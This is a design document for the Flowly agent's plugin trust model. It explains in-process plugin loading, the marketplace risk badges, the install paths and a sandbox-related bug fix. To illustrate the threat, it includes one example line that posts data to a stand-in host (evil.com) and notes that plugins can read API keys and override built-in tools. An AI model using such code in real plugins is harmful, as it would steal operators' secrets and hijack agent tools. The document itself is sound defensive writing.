# Plugin Trust Model

How Flowly treats plugins: the in-process loading model, the
marketplace risk UI, and what the consent contract actually says.
`SECURITY.md` §2.5.

## The honest position

Plugins load into the agent process via
`importlib.util.spec_from_file_location` + `exec_module`. They run
with **full agent privileges** — same memory, same file handles,
same network, same `os.environ`. The agent process holds provider
API keys, channel bot tokens, and the gateway JWT in memory; a
plugin can read all of them. This is not a bug we plan to fix; it
is a property of the runtime, and the security model is built on
top of that property.

The boundary for third-party plugins is:

1. **Operator review before install** (the consent step).
2. **OS sandbox** that limits what *any* code in the agent process
   can do to the host (the OS-level backstop).

Neither of these is the runtime preventing the plugin from doing
something inside the process — that's not the model.

## Why in-process

Three reasons we don't isolate plugins per-process:

1. **Comparable upstream agent frameworks don't either**, and they've
   thought about it carefully. Same in-process
   `importlib.util.exec_module` pattern; same operator-review
   boundary.

2. **The complexity is large.** Process isolation means RPC
   plumbing for every plugin call — tool dispatch, hook fire, etc.
   Serialisation, lifecycle, error propagation, async semantics
   across process boundaries. Adds 1-2 weeks per plugin entrypoint
   to implement and a lot of edge cases to maintain.

3. **The marginal protection is small.** A plugin in a sandboxed
   subprocess could still exfiltrate via the IPC channel back to
   the agent — it has to talk to the agent to do useful work. The
   threat ("plugin reads agent memory") is structural; per-plugin
   isolation moves the boundary but doesn't eliminate it.

We considered building per-plugin isolation (the "Tier 4" branch in
the design conversation that produced this work) and rejected it on
cost. The decision is in [`README.md`](README.md) under "Honest
framing notes".

## Code layout

```
flowly/plugins/
├── manifest.py   — Parse plugin.yaml / plugin.json
├── loader.py     — exec_module() with namespace isolation
├── context.py    — PluginContext passed to register(ctx)
├── manager.py    — Discovery + load + slash-command dispatch
└── adapter.py    — FunctionToolAdapter (function-tool → Flowly Tool)
```

Public surface is `flowly/plugins/__init__.py` — `get_plugin_manager()`
and `discover_plugins()`. `PluginContext` is the only thing
plugins themselves import (or rather, they don't import it — it's
passed to their `register(ctx)` entry function).

## Plugin lifecycle

1. **Discovery.** `PluginManager.discover_and_load()` at
   `manager.py:86` scans three sources in order:
   - `flowly/plugins_bundled/` (ships with package, **default-on**)
   - `~/.flowly/plugins/` (user-installed, opt-in via
     `plugins.enabled` in config)
   - `./.flowly/plugins/` (project-scoped, opt-in via
     `FLOWLY_ENABLE_PROJECT_PLUGINS=1` env)

   Later sources override earlier on key collision.

2. **Manifest parse.** Each plugin dir's `plugin.yaml` is parsed
   (`manifest.py`). Manifest declares `name`, `version`,
   `provides_tools`, `provides_hooks`, `kind`, `manifest_version`.
   Currently only `kind: standalone` is loaded; `backend` and
   `exclusive` parse without error but are skipped.

3. **Filter by enable list.** Bundled plugins load by default
   unless listed in `plugins.disabled`. User / project plugins need
   to be in `plugins.enabled`.

4. **Module load.** `loader.py:46` —
   `importlib.util.spec_from_file_location` builds a spec for the
   plugin's `__init__.py` under the synthetic namespace
   `flowly_plugins.<slug>`. `exec_module` runs it. Module-level
   code runs **now** — anything malicious at the top of `__init__.py`
   fires before `register()` is even called.

5. **`register(ctx)` invocation.** `manager.py:247` —
   `register_fn(ctx)` where ctx is a `PluginContext`. The plugin
   uses the context to register tools / hooks / commands / skills.

6. **Exceptions in step 4-5 are caught.** A failing plugin only
   disables itself — the agent loop keeps running. `manager.py:267`
   logs the error and marks the plugin as not-enabled.

## What a plugin can do

Once loaded, a plugin can call any of:

| Method | Effect |
|---|---|
| `ctx.register_tool(name, schema, handler, ...)` | Adds a function-style tool to the agent's `ToolRegistry`. The LLM can choose to call it. |
| `ctx.register_hook(event, callback)` | Subscribes to a lifecycle event (`pre_tool_call`, `post_tool_call`, `pre_llm_call`, `on_session_end`, etc.). |
| `ctx.register_command(name, handler, ...)` | Adds a `/foo` slash command available across all channels. |
| `ctx.register_skill(name, path, ...)` | Registers a `<plugin>:<skill>` skill that the agent can load. |

Plus, **outside** the public API, the plugin can do anything Python
can do:

- `import requests; requests.post('https://evil.com', data=...)`
- `from flowly.config.loader import load_config; cfg = load_config()`
- Read any file the agent process can read.
- Override any built-in tool by re-registering with the same name
  (the registry's last-write-wins behaviour is intentional — see
  the comment in `agent/tools/registry.py:174`).

Nothing in the runtime prevents these. The boundaries are at the
OS layer (filesystem sandbox + env scrub) and at the consent layer
(the marketplace UI).

## The marketplace risk UI

`flowly-desktop/src/renderer/src/pages/Dashboard/SkillsTab.tsx:102-216`.

The desktop marketplace + installed-plugins lists render a per-card
**risk badge** computed from the plugin's declared
`provides_hooks` and `provides_tools`. Three levels:

| Level | Triggered by | UI |
|---|---|---|
| **high** | `pre_llm_call`, `post_llm_call`, `transform_tool_result` hooks | Red badge "Reads every prompt & response"; Install button labelled "Install — risky" |
| **medium** | `pre_tool_call`, `post_tool_call`, `pre_gateway_dispatch` hooks; OR override of a sensitive built-in tool (`read_file`, `write_file`, `edit_file`, `delete_file`, `exec`, `bash`, `shell`, `web_fetch`, `web_search`) | Amber badge "Elevated access"; "Install — full access" |
| **low** | Anything else | Default badge, plain "Install" |

`classifyPluginRisk()` at `SkillsTab.tsx:142` is the classifier.
Pinned by 18 tests in `SkillsTab.risk.test.ts`.

**Important framing**: this is a **consent aid, not a boundary**.

- The classification is based on what the **manifest declares**.
  A plugin can declare `provides_hooks: []` and then call
  `ctx.register_hook('pre_llm_call', ...)` from `register()`. The
  runtime accepts that registration (it has to — bundled plugins
  legitimately register hooks not in their declared list). The UI
  shows what the manifest said; the plugin code can do otherwise.

- Enforcing the manifest at runtime would require a registration
  gate (refuse hook subscriptions not declared in the manifest).
  Worth considering for a future hardening pass. Not done today.

- The UI's job is to make sure the operator **sees** the risk
  signal before tapping Install. It's the same role Chrome
  extensions show permissions on install. It catches the "I tapped
  Install without reading" mistake, not the deliberate-attacker
  case.

## Plugin install paths

Three paths, all reach the same loader:

1. **Bundled.** `flowly/plugins_bundled/<name>/`. Ships with the
   Python package. Single example today:
   `flowly/plugins_bundled/disk-cleanup/`. Bundled plugins are
   reviewed as part of the Flowly codebase.

2. **CLI install.** `flowly plugins install <git-url|owner/repo|path>`.
   `flowly/cli/plugins_cmd.py:install_cmd`. Clones / copies into
   `~/.flowly/plugins/`, optionally enables.

3. **Desktop marketplace.** Dashboard → Skills → Plugins tab →
   Install button. Two source kinds:
   - `github`: shells out to the CLI (`flowly plugins install owner/repo`).
   - `zip`: downloads from `useflowlyapp.com/api/plugins/<slug>/download`,
     extracts into `~/.flowly/plugins/`, enables via the existing
     config flip. Implementation:
     `flowly-desktop/src/main/local/flowlyai-service.ts:pluginInstallFromMarketplace`.

The marketplace today serves a **curated set** of plugins. There is
no third-party submission flow. If that changes, the marketplace
needs additional supply-chain guards: commit SHA pinning on github
clones, Ed25519-signed manifest whitelists for verified plugins,
maintainer takeover protection. None of those are built today.

## The `disk-cleanup` plugin sandbox compatibility fix

Worth documenting because it illustrates how sandbox + plugin
interaction can surface bugs in plugins that look benign.

`disk-cleanup` (bundled) hooks `post_tool_call` to track files the
agent creates so it can clean them up at session end. Original code
at `flowly/plugins_bundled/disk-cleanup/__init__.py:60`:

```python
def _attempt_track(path_str, session_id):
    p = Path(path_str).expanduser()
    if not p.exists():    # ← calls stat()
        return
    ...
```

Under the sandbox, when the LLM tries to read `~/.ssh/known_hosts`,
the agent's safety check (`flowly/exec/safety.py` protected paths)
rejects the command before execution. But the **`post_tool_call`
hook still fires** with the path in the params — the hook contract
doesn't distinguish "command ran" from "command rejected". The
plugin tried `Path("~/.ssh/known_hosts").exists()`, which `stat()`s,
which the sandbox denies with `PermissionError`.

The hook runner caught the exception and logged
`hook post_tool_call callback failed`. No agent breakage, but noisy
logs every time the LLM emits a denied command.

Fix in commit `b6077dd`: wrap the body in `try/except OSError` plus a
defensive broad `except Exception` clause. The docstring already
promised "never raises"; the fix made it true.

**Lesson for plugin authors**: hooks that touch the filesystem on
LLM-supplied paths must handle `OSError` defensively. The agent
process may be sandboxed; paths the LLM emitted may be denied; the
hook still fires.

## Slash commands

`PluginContext.register_command(name, handler, ...)` adds a `/foo`
slash command across all channels (Telegram, Discord, Slack, Web,
Desktop). Names are auto-lowercased and hyphenated (`/Foo Bar` →
`/foo-bar`). Four names are reserved: `new`, `clear`, `compact`,
`help`. Conflict → log warning, skip.

Slash command names are namespace-shared across plugins. Last
registration wins. Most plugins prefix their commands with the
plugin name to avoid collisions (`/disk-cleanup`, `/auto-commit`,
…).

## Plugin skills

`PluginContext.register_skill(name, path, ...)` registers a
plugin-namespaced skill that becomes loadable as
`<plugin>:<name>` via `skill_view`. **Plugin skills do not appear
in the system prompt's available-skills list** — they are
explicit-load only. Keeps the prompt-cache prefix stable across
plugin sets.

## Versioning

Manifest `manifest_version` is the schema versioning knob. Currently
`1`. A higher number is rejected with a warning (avoids loading a
plugin built against a future schema this Flowly doesn't
understand).

`provides_*` declarations are informational in v1 — there's no
runtime enforcement that the plugin only registers what it declared.
A future hardening pass could add that.

## Related commits

| SHA | What |
|---|---|
| `d97c14a` | Marketplace + plugin card risk classification UI |
| `b6077dd` | disk-cleanup PermissionError fix for sandbox compatibility |
| `d8af2af` | Risk classifier test suite |
